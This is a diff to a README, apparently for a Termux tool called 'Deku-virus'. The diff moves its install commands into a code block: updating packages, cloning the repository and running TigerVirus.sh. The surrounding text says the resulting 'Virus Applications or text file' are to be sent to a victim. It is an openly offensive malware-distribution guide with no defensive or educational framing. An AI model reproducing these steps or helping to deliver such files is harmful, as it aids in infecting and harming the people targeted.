@@ -21,17 +21,14 @@
 
 <h4>_________</h4>
 
-$ apt update 
-
-$ apt upgrade -y
-
-$ pkg install git -y
-
-$ git clone https://github.com/Deku0019523f/Deku-virus.git
-
-$ cd Deku-virus
-
-$ bash TigerVirus.sh
+```bash
+ apt update 
+ apt upgrade -y
+ pkg install git -y
+ git clone https://github.com/Deku0019523f/Deku-virus.git
+ cd Deku-virus
+ bash TigerVirus.sh
+```
 
 After Installation the Virus Applications or text file
 Send To Victim If Application
